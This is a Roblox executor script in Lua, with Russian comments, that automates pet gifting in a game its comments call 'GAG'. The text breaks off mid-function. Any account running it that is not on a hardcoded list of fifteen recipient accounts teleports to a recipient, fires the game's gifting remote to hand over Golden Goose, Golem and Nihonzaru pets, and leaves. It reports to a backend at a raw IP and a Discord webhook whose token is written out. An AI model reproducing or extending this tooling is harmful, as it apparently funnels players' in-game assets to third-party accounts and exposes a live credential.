getgenv().Config = {
    Recipients = {
        "Supeengen519",
        "Tesarhasic07760",
        "Attienauta37004",
        "Manosbehne2761",
        "Quossflock55440",
        "Needrafal81596",
        "Mattegoda90168",
        "Okulaovitz4972",
        "Vancejaqua868",
        "Maunugorri8197",
        "Davidraus440",
        "Reeefe645",
        "Uragabuthe0174",
        "Ehlenlewy9254",
        "Piccaselva37999",
    },
    PetsToTrade = {
        "Golden Goose",
        "Golem",
        "Nihonzaru",
    },
    RecipientPetMap = {
        ["Supeengen519"] = {"Golden Goose"},
        ["Tesarhasic07760"] = {"Golden Goose"},
        ["Attienauta37004"] = {"Golden Goose"},
        ["Manosbehne2761"] = {"Golden Goose"},
        ["Quossflock55440"] = {"Golden Goose"},
        ["Needrafal81596"] = {"Golem"},
        ["Mattegoda90168"] = {"Golem"},
        ["Okulaovitz4972"] = {"Golem"},
        ["Vancejaqua868"] = {"Golem"},
        ["Maunugorri8197"] = {"Golem"},
        ["Davidraus440"] = {"Nihonzaru"},
        ["Reeefe645"] = {"Nihonzaru"},
        ["Uragabuthe0174"] = {"Nihonzaru"},
        ["Ehlenlewy9254"] = {"Nihonzaru"},
        ["Piccaselva37999"] = {"Nihonzaru"},
    },
    Enabled = true,
    BackendURL = "http://45.150.128.26:8000",
    UseBackend = true,
    AutoTeleport = true,
    SkipTeleportIfNoPets = true,
    LeaveServerAfterTrade = true,
    DiscordWebhook = "https://discord.com/api/webhooks/1405625962657480815/BMlUrUwfIWNqvBCjn_aAGjYzr0Pmls3K8jaI32YbrAZreumG10S-x3FNN-9ulviO-1zi",
    DiscordNotifications = true,
    -- Умный поиск серверов для реципиентов
    SmartServerSearch = true,
    MinFreeSlots = 2, -- минимальное количество свободных слотов на сервере
    PreferLowerPopulation = true, -- отдавать предпочтение менее заполненным серверам
    ServerScanPages = 3, -- сколько страниц API просматривать (по 100 серверов на страницу)
    AvoidNearlyFullThreshold = 0.9 -- избегать серверов, заполненных на 90% и более
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AutoTradeGUI"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(0, 350, 0, 250)
Frame.Position = UDim2.new(0, 10, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Text = "Auto Trade Status"
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.Parent = Frame

local UICorner2 = Instance.new("UICorner")
UICorner2.CornerRadius = UDim.new(0, 8)
UICorner2.Parent = Title

local CopyButton = Instance.new("TextButton")
CopyButton.Name = "CopyButton"
CopyButton.Size = UDim2.new(0, 80, 0, 25)
CopyButton.Position = UDim2.new(1, -170, 0, 5)
CopyButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.Text = "Copy All"
CopyButton.TextScaled = true
CopyButton.Font = Enum.Font.GothamBold
CopyButton.Parent = Title

local UICorner4 = Instance.new("UICorner")
UICorner4.CornerRadius = UDim.new(0, 4)
UICorner4.Parent = CopyButton

local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 80, 0, 25)
CloseButton.Position = UDim2.new(1, -85, 0, 5)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Text = "Close"
CloseButton.TextScaled = true
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = Title

local UICorner5 = Instance.new("UICorner")
UICorner5.CornerRadius = UDim.new(0, 4)
UICorner5.Parent = CloseButton

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Name = "LogFrame"
ScrollingFrame.Size = UDim2.new(1, -10, 1, -50)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 40)
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.Parent = Frame

local UICorner3 = Instance.new("UICorner")
UICorner3.CornerRadius = UDim.new(0, 6)
UICorner3.Parent = ScrollingFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = ScrollingFrame
UIListLayout.Padding = UDim.new(0, 2)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

local allMessages = {}

local function AddMessage(message, messageType)
    messageType = messageType or "info"
    
    local colors = {
        info = Color3.fromRGB(255, 255, 255),
        success = Color3.fromRGB(0, 255, 0),
        warning = Color3.fromRGB(255, 255, 0),
        error = Color3.fromRGB(255, 0, 0)
    }
    
    table.insert(allMessages, message)
    
    local TextLabel = Instance.new("TextLabel")
    TextLabel.Size = UDim2.new(1, 0, 0, 20)
    TextLabel.BackgroundTransparency = 1
    TextLabel.TextColor3 = colors[messageType] or colors.info
    TextLabel.Text = message
    TextLabel.TextScaled = true
    TextLabel.Font = Enum.Font.Gotham
    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
    TextLabel.Parent = ScrollingFrame
    
    local children = ScrollingFrame:GetChildren()
    if #children > 50 then
        children[1]:Destroy()
    end
    
    ScrollingFrame.CanvasPosition = Vector2.new(0, ScrollingFrame.CanvasSize.Y.Offset)
end

local function CopyAllMessages()
    local clipboard = table.concat(allMessages, "\n")
    
    if setclipboard then
        setclipboard(clipboard)
        AddMessage("Все сообщения скопированы в буфер обмена!", "success")
    else
        local clipboardGui = Instance.new("ScreenGui")
        clipboardGui.Name = "ClipboardGui"
        clipboardGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        
        local clipboardFrame = Instance.new("Frame")
        clipboardFrame.Size = UDim2.new(0, 400, 0, 300)
        clipboardFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
        clipboardFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        clipboardFrame.BorderSizePixel = 0
        clipboardFrame.Parent = clipboardGui
        
        local UICorner5 = Instance.new("UICorner")
        UICorner5.CornerRadius = UDim.new(0, 8)
        UICorner5.Parent = clipboardFrame
        
        local clipboardTitle = Instance.new("TextLabel")
        clipboardTitle.Size = UDim2.new(1, 0, 0, 30)
        clipboardTitle.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        clipboardTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        clipboardTitle.Text = "Скопированные сообщения"
        clipboardTitle.TextScaled = true
        clipboardTitle.Font = Enum.Font.GothamBold
        clipboardTitle.Parent = clipboardFrame
        
        local clipboardTextBox = Instance.new("TextBox")
        clipboardTextBox.Size = UDim2.new(1, -20, 1, -40)
        clipboardTextBox.Position = UDim2.new(0, 10, 0, 35)
        clipboardTextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        clipboardTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        clipboardTextBox.Text = clipboard
        clipboardTextBox.TextXAlignment = Enum.TextXAlignment.Left
        clipboardTextBox.TextYAlignment = Enum.TextYAlignment.Top
        clipboardTextBox.TextWrapped = true
        clipboardTextBox.Font = Enum.Font.Gotham
        clipboardTextBox.Parent = clipboardFrame
        
        local closeButton = Instance.new("TextButton")
        closeButton.Size = UDim2.new(0, 80, 0, 25)
        closeButton.Position = UDim2.new(0.5, -40, 1, -30)
        closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeButton.Text = "Закрыть"
        closeButton.TextScaled = true
        closeButton.Font = Enum.Font.GothamBold
        closeButton.Parent = clipboardFrame
        
        closeButton.MouseButton1Click:Connect(function()
            clipboardGui:Destroy()
        end)
        
        AddMessage("Сообщения показаны в окне. Скопируйте текст вручную.", "info")
    end
end

CopyButton.MouseButton1Click:Connect(CopyAllMessages)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    AddMessage("UI закрыт. Скрипт продолжает работать в фоне.", "info")
end)

local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
local AcceptPetGift = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("AcceptPetGift")
local GiftPet = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")

local function GetPetData(tool)
    if not tool or not tool:IsA("Tool") then
        return nil
    end
    
    local petUUID = tool:GetAttribute("PET_UUID")
    if not petUUID then
        return nil
    end
    
    return {
        Name = tool.Name,
        UUID = petUUID,
        Tool = tool
    }
end

local function GetFullInventory()
    local inventory = {}
    local character = LocalPlayer.Character
    
    if not character then
        return inventory
    end
    
    -- Ищем предметы в персонаже (в руках)
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(inventory, item)
        end
    end
    
    -- Ищем предметы в рюкзаке
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(inventory, item)
            end
        end
    end
    
    return inventory
end

-- Функция для поиска питомцев в инвентаре
local function GetPetsInInventory()
    local pets = {}
    local character = LocalPlayer.Character
    
    if not character then
        return pets
    end
    
    -- Ищем питомцев в персонаже (в руках)
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") and item:GetAttribute("PET_UUID") then
            local petData = GetPetData(item)
            if petData then
                table.insert(pets, petData)
            end
        end
    end
    
    -- Ищем питомцев в рюкзаке
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") and item:GetAttribute("PET_UUID") then
                local petData = GetPetData(item)
                if petData then
                    table.insert(pets, petData)
                end
            end
        end
    end
    
    return pets
end

-- Функция для взятия питомца в руки
local function EquipPet(petData)
    if not petData or not petData.Tool then
        return false
    end
    
    local character = LocalPlayer.Character
    if not character then
        return false
    end
    
    -- Проверяем, не держим ли уже этот питомец
    local currentTool = character:FindFirstChildWhichIsA("Tool")
    if currentTool and currentTool == petData.Tool then
        return true -- Уже держим нужного питомца
    end
    
    -- Берем питомца в руки
    if petData.Tool.Parent == LocalPlayer.Backpack then
        petData.Tool.Parent = character
        AddMessage("Взял в руки питомца: " .. petData.Name, "info")
    else
        AddMessage("Питомец уже в руках: " .. petData.Name, "info")
    end
    
    return true
end

-- Функция для извлечения основного имени питомца (без веса и возраста)
local function GetBasePetName(fullPetName)
    -- Убираем информацию о весе и возрасте
    local baseName = fullPetName:match("^([^%[]+)")
    if baseName then
        return baseName:gsub("%s+$", "") -- Убираем пробелы в конце
    end
    return fullPetName
end

-- Функция для проверки, является ли питомец в списке для трейда
local function IsPetInTradeList(petName)
    local basePetName = GetBasePetName(petName)
    
    for _, pet in pairs(getgenv().Config.PetsToTrade) do
        if pet == basePetName then
            return true
        end
    end
    return false
end

-- Построение обратной мапы питомец -> множество получателей
local function BuildPetToRecipientsMap()
    local map = {}
    local prefs = getgenv().Config.RecipientPetMap or {}
    for username, petList in pairs(prefs) do
        if type(petList) == "string" then
            petList = {petList}
        end
        for _, name in pairs(petList) do
            local base = GetBasePetName(name)
            map[base] = map[base] or {}
            map[base][username] = true
        end
    end
    return map
end

-- Разрешен ли питомец для конкретного получателя согласно маппингу
local function IsPetAllowedForRecipient(petName, recipient, petToRecipients)
    local base = GetBasePetName(petName)
    if petToRecipients[base] then
        return petToRecipients[base][recipient] == true
    end
    return true
end

-- Есть ли в инвентаре питомцы, подходящие под маппинг для получателя
local function HasPetsForRecipient(recipient)
    local petToRecipients = BuildPetToRecipientsMap()
    local pets = GetPetsInInventory()
    for _, petData in pairs(pets) do
        if IsPetInTradeList(petData.Name) and IsPetAllowedForRecipient(petData.Name, recipient, petToRecipients) then
            return true
        end
    end
    return false
end

-- Функция для HTTP запросов к бекенду
local function MakeHttpRequest(url, method, data)
    -- Пробуем разные варианты HTTP запросов
    local request = http_request or (syn and syn.request) or request or HttpService.RequestAsync
    
    -- Отладочная информация о доступных методах
    if http_request then
        AddMessage("Используется http_request", "info")
    elseif syn and syn.request then
        AddMessage("Используется syn.request", "info")
    elseif request then
        AddMessage("Используется request", "info")
    elseif HttpService.RequestAsync then
        AddMessage("Используется HttpService.RequestAsync", "info")
    else
        AddMessage("Нет доступных методов HTTP запросов", "error")
        return nil
    end
    
    local success, result = pcall(function()
        if method == "GET" then
            if request == HttpService.RequestAsync then
                -- Используем HttpService.RequestAsync как fallback
                local response = request(HttpService, {
                    Url = url,
                    Method = "GET"
                })
                return response.Body
            else
                -- Используем http_request или syn.request
                local response = request({
                    Url = url,
                    Method = "GET"
                })
                return response.Body
            end
        elseif method == "POST" then
            if request == HttpService.RequestAsync then
                -- Используем HttpService.RequestAsync как fallback
                local response = request(HttpService, {
                    Url = url,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode(data)
                })
                return response.Body
            else
                -- Используем http_request или syn.request
                local response = request({
                    Url = url,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode(data)
                })
                return response.Body
            end
        elseif method == "DELETE" then
            if request == HttpService.RequestAsync then
                -- Используем HttpService.RequestAsync как fallback
                local response = request(HttpService, {
                    Url = url,
                    Method = "DELETE"
                })
                return response.Body
            else
                -- Используем http_request или syn.request
                local response = request({
                    Url = url,
                    Method = "DELETE"
                })
                return response.Body
            end
        end
    end)
    
    if success and result then
        local success2, decoded = pcall(function()
            return HttpService:JSONDecode(result)
        end)
        
        if success2 then
            return decoded
        else
            AddMessage("Ошибка декодирования JSON: " .. tostring(decoded), "error")
            return nil
        end
    else
        AddMessage("Ошибка HTTP запроса: " .. tostring(result), "error")
        return nil
    end
end

-- =====================
-- УМНЫЙ ПОИСК СЕРВЕРОВ
-- =====================
-- Roblox public servers listing endpoint: https://games.roblox.com/v1/games/{placeId}/servers/Public?sortOrder=Asc&limit=100&cursor=
local function FetchPublicServersPage(placeId, cursor)
    local base = "https://games.roblox.com/v1/games/" .. tostring(placeId) .. "/servers/Public?sortOrder=Asc&limit=100"
    if cursor and cursor ~= "" then
        base = base .. "&cursor=" .. cursor
    end
    local response = MakeHttpRequest(base, "GET")
    if response and response.data then
        return response
    end
    return nil
end

local function ScoreServer(entry, minFreeSlots, preferLowerPopulation, avoidNearlyFullThreshold)
    local playing = entry.playing or 0
    local maxPlayers = entry.maxPlayers or game.Players.MaxPlayers
    local free = math.max(maxPlayers - playing, 0)
    local nearlyFull = (playing / math.max(maxPlayers, 1)) >= avoidNearlyFullThreshold
    local pingMs = tonumber(entry.ping) or nil

    if free < minFreeSlots then
        return -1 -- отбрасываем как не подходящий
    end
    -- Базовый скор: больше свободных слотов = лучше
    local score = free * 10
    -- Наказание за почти полный
    if nearlyFull then
        score = score - 50
    end
    -- Если предпочитаем меньшую заполняемость, уменьшим очки серверов с большим playing
    if preferLowerPopulation then
        score = score - playing
    end
    -- Чем меньше пинг, тем лучше. Мягкое влияние, если пинг известен
    if pingMs then
        score = score - (pingMs / 50)
    end
    return score
end

local function FindBestPublicServer(placeId)
    if not getgenv().Config.SmartServerSearch then return nil end

    local minFree = getgenv().Config.MinFreeSlots or 2
    local preferLow = getgenv().Config.PreferLowerPopulation ~= false
    local pages = math.max((getgenv().Config.ServerScanPages or 2), 1)
    local avoidThreshold = getgenv().Config.AvoidNearlyFullThreshold or 0.9

    local bestEntry = nil
    local bestScore = -math.huge
    local cursor = nil

    for page = 1, pages do
        local pageData = FetchPublicServersPage(placeId, cursor)
        if not pageData then break end

        for _, entry in ipairs(pageData.data or {}) do
            -- пропускаем текущий сервер
            if entry.id ~= game.JobId then
                local score = ScoreServer(entry, minFree, preferLow, avoidThreshold)
                if score and score > bestScore then
                    bestScore = score
                    bestEntry = entry
                end
            end
        end

        if not pageData.nextPageCursor or pageData.nextPageCursor == "" then
            break
        end
        cursor = pageData.nextPageCursor
        task.wait(0.1)
    end

    -- Отбрасываем, если так и не нашли подходящий
    if bestScore < 0 then
        return nil
    end
    return bestEntry
end

local function TeleportReceiverToSmartServer()
    local placeId = 126884695634066
    local best = FindBestPublicServer(placeId)
    if not best then
        AddMessage("Smart search: подходящий сервер не найден", "warning")
        return false
    end
    local pingInfo = best.ping and (", ping=" .. tostring(best.ping) .. "ms") or ""
    AddMessage("Smart search: найден сервер " .. tostring(best.id) .. " (" .. tostring(best.playing) .. "/" .. tostring(best.maxPlayers) .. ")" .. pingInfo, "info")
    local ok, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId, best.id)
    end)
    if ok then
        AddMessage("Smart search: телепорт выполнен", "success")
        return true
    else
        AddMessage("Smart search: ошибка телепорта: " .. tostring(err), "error")
        return false
    end
end

-- Функция для проверки, является ли сервер VIP
local function IsVipServer()
    local currentPlayers = #game.Players:GetPlayers()
    
    -- Если мы одни на сервере, значит это VIP сервер
    if currentPlayers == 1 then
        return true
    end
    
    -- Дополнительная проверка через JobId (на случай если есть другие индикаторы)
    local jobId = game.JobId
    if jobId:find("vip") or jobId:find("VIP") or jobId:find("private") or jobId:find("PRIVATE") then
        return true
    end
    
    -- Дополнительная проверка через TeleportService
    local success, result = pcall(function()
        return TeleportService:GetLocalPlayerTeleportData()
    end)
    
    if success and result and (result.vip or result.VIP or result.private or result.PRIVATE) then
        return true
    end
    
    return false
end

-- Функция для проверки, полный ли сервер
local function IsServerFull()
    local maxPlayers = game.Players.MaxPlayers
    local currentPlayers = #game.Players:GetPlayers()
    
    -- Считаем сервер полным, если занято 95% мест
    local fullThreshold = math.floor(maxPlayers * 0.95)
    
    return currentPlayers >= fullThreshold
end

-- Функция для перехода на обычный сервер
local function RejoinNormalServer()
    local placeId = 126884695634066 -- ID игры GAG
    
    -- Проверяем, являемся ли мы получателем
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Только получатели могут переходить на обычные серверы
    if not isReceiver then
        AddMessage("Отправители не переходят на обычные серверы (остаемся на текущем)", "info")
        return false
    end
    
    AddMessage("Переход на обычный сервер (получатель)...", "info")
    
    -- Только умный поиск, без стандартного Teleport
    if getgenv().Config.SmartServerSearch then
        local smartOk = TeleportReceiverToSmartServer()
        if smartOk then
            return true
        else
            AddMessage("Smart search не удался: подходящий сервер не найден", "warning")
            return false
        end
    else
        AddMessage("Smart Server Search отключен — переход отменен", "warning")
        return false
    end
end

-- Функция для выхода с сервера (кик отправителя после трейда)
local function LeaveServerAfterTrade()
    local placeId = 126884695634066 -- ID игры GAG
    
    AddMessage("Отправитель: выход с сервера после трейда...", "info")
    
    local success, error = pcall(function()
        TeleportService:Teleport(placeId)
    end)
    
    if success then
        AddMessage("Выход с сервера запущен...", "success")
        return true
    else
        AddMessage("Ошибка выхода с сервера: " .. tostring(error), "error")
        return false
    end
end

-- Функция для проверки, есть ли у игрока питомцы для трейда
local function HasPetsForTrade()
    local petsInInventory = GetPetsInInventory()
    local hasTradePets = false
    
    for _, petData in pairs(petsInInventory) do
        if IsPetInTradeList(petData.Name) then
            hasTradePets = true
            break
        end
    end
    
    return hasTradePets
end

-- Function to get pets count in inventory
local function GetPetsCountInInventory()
    local petsInInventory = GetPetsInInventory()
    return #petsInInventory
end

-- Function to reset inventory notification flag if inventory is normalized
local function ResetInventoryNotificationIfNormalized()
    if not getgenv().Config.UseBackend then return end
    local petsCount = GetPetsCountInInventory()
    if petsCount <= 55 then
        local url = getgenv().Config.BackendURL .. "/api/reset-inventory-notification"
        local data = { username = LocalPlayer.Name }
        local response = MakeHttpRequest(url, "POST", data)
        if response and response.success then
            AddMessage("Inventory notification flag reset (backend)", "info")
        end
    end
end

-- Function to check if receiver should be disabled due to inventory overflow
local function ShouldDisableReceiverDueToOverflow()
    -- Reset notification if inventory is normalized
    ResetInventoryNotificationIfNormalized()
    -- Check if we are a receiver
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Only receivers check for overflow
    if not isReceiver then
        return false
    end
    
    local petsCount = GetPetsCountInInventory()
    
    if petsCount > 55 then
        AddMessage("⚠️ INVENTORY OVERFLOW: " .. petsCount .. " pets!", "error")
        AddMessage("Receiver disabled from backend due to overflow (>55 pets)", "warning")
        AddMessage("Staying in game but not registering as receiver", "info")
        
        -- Проверка через backend, отправлять ли уведомление
        local shouldNotify = true
        if getgenv().Config.UseBackend then
            local url = getgenv().Config.BackendURL .. "/api/notify-inventory-full"
            local data = { username = LocalPlayer.Name }
            local response = MakeHttpRequest(url, "POST", data)
            if response and response.alreadyNotified then
                shouldNotify = false
                AddMessage("Discord notification already sent for this user (backend)", "info")
            end
        end
        
        if shouldNotify then
            -- Send Discord notification
            local petsInInventory = GetPetsInInventory()
            local petsList = {}
            for _, petData in pairs(petsInInventory) do
                table.insert(petsList, petData.Name)
            end
            SendInventoryFullNotification(LocalPlayer.Name, petsCount, petsList)
        end
        
        return true
    end
    
    return false
end

-- Variable to track last used receiver
getgenv().LastUsedReceiverIndex = getgenv().LastUsedReceiverIndex or 0

-- Function to send Discord notification
local function SendDiscordNotification(message, color)
    if not getgenv().Config.DiscordNotifications or not getgenv().Config.DiscordWebhook or getgenv().Config.DiscordWebhook == "" then
        return
    end
    
    local embed = {
        title = "Auto Trade Notification",
        description = message,
        color = color or 16711680, -- Red by default
        timestamp = DateTime.now():ToIsoDateString(),
        footer = {
            text = "Auto Trade System"
        }
    }
    
    local data = {
        embeds = {embed}
    }
    
    local url = getgenv().Config.DiscordWebhook
    local response = MakeHttpRequest(url, "POST", data)
    
    if response then
        AddMessage("Discord notification sent", "success")
    else
        AddMessage("Failed to send Discord notification", "error")
    end
end

-- Function to send inventory full notification
local function SendInventoryFullNotification(username, petsCount, petsList)
    if not getgenv().Config.DiscordNotifications then
        return
    end
    
    local message = "**Inventory is full!**\n"
    message = message .. "**User:** " .. username .. "\n"
    message = message .. "**Pets in inventory:** " .. petsCount .. "\n"
    message = message .. "**Pets list:**\n"
    
    for i, petName in pairs(petsList) do
        message = message .. i .. ". " .. petName .. "\n"
    end
    
    SendDiscordNotification(message, 16711680) -- Red color
end

-- Function to check receivers via backend
local function CheckReceiversViaBackend()
    if not getgenv().Config.UseBackend then
        return nil
    end
    
    -- Check if we are a receiver
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Only receivers check and move from VIP/full servers
    if isReceiver then
        -- Check if we are on VIP server
        if IsVipServer() then
            AddMessage("Receiver: VIP server detected, moving to normal server...", "warning")
            RejoinNormalServer()
            return nil
        end
        
        -- Check if server is full -> теперь просто ждем, не переходим
        if IsServerFull() then
            AddMessage("Receiver: server is full, waiting on current server", "info")
            return nil
        end
    else
        -- We are sender, check if we have pets for trading
        if not HasPetsForTrade() then
            AddMessage("Sender: no pets for trading in inventory, waiting...", "warning")
            return nil
        end
        
        -- Senders can be on VIP/full servers; still proceed to backend check
        if IsVipServer() then
            AddMessage("Sender: VIP server, proceeding to backend check", "info")
        end
        if IsServerFull() then
            AddMessage("Sender: server is full, proceeding to backend check", "info")
        end
    end
    
    local usernames = table.concat(getgenv().Config.Recipients, ",")
    local url = getgenv().Config.BackendURL .. "/api/check-receivers?usernames=" .. usernames
    
    local response = MakeHttpRequest(url, "GET")
    if response and response.success and response.availableReceivers and #response.availableReceivers > 0 then
        -- Фильтрация получателей по маппингу питомцев
        local filtered = {}
        local petToRecipients = BuildPetToRecipientsMap()
        for _, r in ipairs(response.availableReceivers) do
            if HasPetsForRecipient(r.username) then
                table.insert(filtered, r)
            end
        end

        local list = (#filtered > 0) and filtered or response.availableReceivers

        -- Receiver rotation for even distribution
        local availableCount = #list
        
        -- Increase index for next receiver
        getgenv().LastUsedReceiverIndex = getgenv().LastUsedReceiverIndex + 1
        
        -- If index exceeds available receivers count, start from beginning
        if getgenv().LastUsedReceiverIndex > availableCount then
            getgenv().LastUsedReceiverIndex = 1
        end
        
        local selectedReceiver = list[getgenv().LastUsedReceiverIndex]
        
        AddMessage("Selected receiver " .. getgenv().LastUsedReceiverIndex .. " of " .. availableCount .. ": " .. selectedReceiver.username, "info")
        
        return selectedReceiver
    end
    
    return nil
end

-- Function to teleport to receiver
local function TeleportToReceiver(receiverData)
    if not getgenv().Config.AutoTeleport or not receiverData then
        return false
    end
    
    -- Check if we have pets for trading (if setting is enabled)
    if getgenv().Config.SkipTeleportIfNoPets then
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if not isReceiver and not HasPetsForTrade() then
            AddMessage("Skipping teleport: no pets for trading", "warning")
            return false
        end
    end
    
    local placeId = 126884695634066 -- GAG game ID
    local serverId = receiverData.serverId
    
    AddMessage("Teleporting to receiver: " .. receiverData.username .. " on server: " .. serverId, "info")
    
    local success, error = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId, serverId)
    end)
    
    if success then
        AddMessage("Teleport started...", "success")
        return true
    else
        AddMessage("Teleport error: " .. tostring(error), "error")
        return false
    end
end

-- Очередь: запрос резервации для отправителя
local function RequestQueueReservation()
    if not getgenv().Config.UseBackend then return nil end

    -- Определяем роль: только отправитель запрашивает очередь
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    if isReceiver then return nil end

    -- Если нет питомцев — выходим
    if not HasPetsForTrade() then return nil end

    local url = getgenv().Config.BackendURL .. "/api/queue/request"
    local body = { sender = LocalPlayer.Name, receivers = getgenv().Config.Recipients }
    local resp = MakeHttpRequest(url, "POST", body)
    if not resp or not resp.success then return nil end
    if resp.reserved then
        AddMessage("Queue: reserved receiver " .. resp.reserved.receiver .. ", pos=1", "success")
        return { username = resp.reserved.receiver, serverId = resp.reserved.serverId, jobId = resp.reserved.jobId }
    elseif resp.queued then
        AddMessage("Queue: queued for receiver " .. resp.queued.receiver .. ", position " .. tostring(resp.queued.position), "info")
        return nil
    end
    return nil
end

-- Очередь: освободить резервацию (вызывать после завершения или отказа)
local function ReleaseQueueReservation(receiverUsername)
    if not getgenv().Config.UseBackend or not receiverUsername then return end
    local url = getgenv().Config.BackendURL .. "/api/queue/release"
    local body = { sender = LocalPlayer.Name, receiver = receiverUsername }
    local resp = MakeHttpRequest(url, "POST", body)
    if resp and resp.success then
        AddMessage("Queue: reservation released for receiver " .. receiverUsername, "info")
    end
end

-- Function to find first available player from recipients list
local function FindFirstAvailableRecipient()
    -- First check if there's a receiver on current server
    for _, username in pairs(getgenv().Config.Recipients) do
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name == username then
                -- Check mapping: do we have allowed pets for this receiver?
                if HasPetsForRecipient(player.Name) then
                    AddMessage("Found receiver on current server: " .. player.Name, "success")
                    return player
                else
                    AddMessage("Receiver on server found but no mapped pets for them: " .. player.Name, "warning")
                end
            end
        end
    end
    
    -- If no receiver on current server, check via backend
    if getgenv().Config.UseBackend then
        local backendReceiver = CheckReceiversViaBackend()
        if backendReceiver then
            AddMessage("Found receiver via backend: " .. backendReceiver.username, "success")
            
            -- If autoteleport is enabled AND we are NOT receiver, then teleport
            if getgenv().Config.AutoTeleport and LocalPlayer.Name ~= backendReceiver.username then
                local ok = TeleportToReceiver(backendReceiver)
                if ok then
                    return nil -- телепорт инициирован
                else
                    AddMessage("Teleport to receiver failed, will retry later", "warning")
                end
            elseif LocalPlayer.Name == backendReceiver.username then
                -- We are receiver ourselves, don't teleport
                AddMessage("We are receiver, waiting for sender...", "info")
                return nil
            end
        end
    end
    
    return nil
end

-- Function to find player by name
local function FindPlayerByName(username)
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == username then
            return player
        end
    end
    return nil
end

-- Function to send pet
local function SendPet(petData, targetPlayer)
    if not petData or not targetPlayer then
        return false
    end
    
    -- Check if pet is still in inventory
    if not petData.Tool or not petData.Tool.Parent then
        AddMessage("Pet not found anymore: " .. petData.Name, "error")
        return false
    end
    
    local args = {
        "GivePet",
        targetPlayer
    }
    
    PetGiftingService:FireServer(unpack(args))
    AddMessage("Sent pet: " .. petData.Name .. " to player: " .. targetPlayer.Name, "success")
    
    -- Small delay for server processing
    task.wait(0.2)
    
    return true
end

-- Function to accept gift
local function AcceptGift(giftId)
    local args = {
        true,
        giftId
    }
    
    AcceptPetGift:FireServer(unpack(args))
    AddMessage("Accepted gift with ID: " .. giftId, "success")
end

-- Function to register receiver in backend
local function RegisterAsReceiver()
    if not getgenv().Config.UseBackend then
        return
    end
    
    -- Check if we are a receiver
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Only receivers register and react to VIP/full servers
    if isReceiver then
        -- Check inventory overflow
        if ShouldDisableReceiverDueToOverflow() then
            AddMessage("Receiver: disabled due to inventory overflow, not registering", "warning")
            return false
        end

        -- If on VIP server → move to public before registration
